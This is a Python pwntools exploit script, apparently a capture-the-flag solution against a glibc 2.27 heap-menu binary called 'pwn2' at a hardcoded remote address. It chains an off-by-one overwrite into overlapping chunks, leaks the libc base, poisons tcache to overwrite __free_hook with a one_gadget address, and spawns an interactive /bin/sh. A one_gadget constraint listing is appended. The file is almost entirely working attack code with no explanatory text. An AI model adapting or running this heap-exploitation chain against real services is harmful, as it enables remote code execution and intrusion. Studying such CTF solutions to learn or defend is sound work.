#coding=utf-8
from pwn import *

context(arch="amd64", os="linux")
context.log_level='debug'
# context.terminal=['tmux','splitw','-h']

ip = '113.201.14.253'
port = '16066'
reomote_addr = [ip,port]
binary = './pwn2'

libc = ELF('/home/tamako/Desktop/tools/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so')
elf = ELF(binary)
if len(sys.argv)==1:
    p = process(binary)

if len(sys.argv)==2 :
    p = remote(reomote_addr[0],reomote_addr[1])

#----------------------------------------------------------------------
ru = lambda x : p.recvuntil(x,timeout=0.2)
sd = lambda x : p.send(x)
rl = lambda   : p.recvline()
sl = lambda x : p.sendline(x)
rv = lambda x : p.recv(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)
it = lambda :p.interactive()
ru7f = lambda : u64(ru('\x7f')[-6:].ljust(8,b'\x00'))
rv6 = lambda : u64(rv(6)+b'\x00'*2)
lg = lambda s: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
bp = lambda src=None : attach(p,src)
sym = lambda name : libc.sym[name]
#----------------------------------------------------------------------

def leak(offset):
	addr = u64(p.recvuntil('\x7e')[-6:].ljust(8,'\x00'))
	base = addr - offset
	print "[+]libc_base=>"+hex(base)
	return base

def menu(idx):
	ru("Choice: ")
	sl(str(idx))

def add(size,content='a'):
	menu(1)
	ru("size: ")
	sd(str(size))
	ru("content: ")
	sl(content)

def edit(idx,content):
	menu(2)
	ru("idx: ")
	sd(str(idx))
	ru("content: ")
	sl(content)

def free(idx):
	menu(3)
	ru("idx: ")
	sd(str(idx))

def show(idx):
	menu(4)
	ru("idx: ")
	sd(str(idx))

#_one
add(0xf8) # free 0
add(0xf8) # 1
add(0xf8) # 2
add(0xf8) # 2
add(0xf8) # 4off_by_one
add(0xf8) # 5fake presize
add(0xf0) # 6protect

#7-12
for i in range(7):
	add(0xf8)

# attach(p)
# free(0)
free(4)
payload = 'a'*0xf0 + p64(0x500)
add(0xf8,payload) # 4

for i in range(7):
	free(7+i)

free(0)
free(5)
#0 1 2 3 4 5 0/5 freed
for i in range(7):
	add(0xf8)
#0 5 7 8 9 10 11
add(0xf8) #12
show(1)

addr = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
libc_base = addr - 96 - libc.sym['__malloc_hook']-0x10
print "libc=>"+hex(libc_base)

shell = 0x4f432 + libc_base

add(0xf8) # 13
free(2)
free(1)

edit(13,p64(libc.sym['__free_hook'] + libc_base))

# pause()
add(0xf8) # 1
# pause()
add(0xf8,p64(shell)) # 2 shell

# pause()

# edit(2,p64(shell))
free(4)
# pause()
it()


"""
0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f432 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a41c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL


"""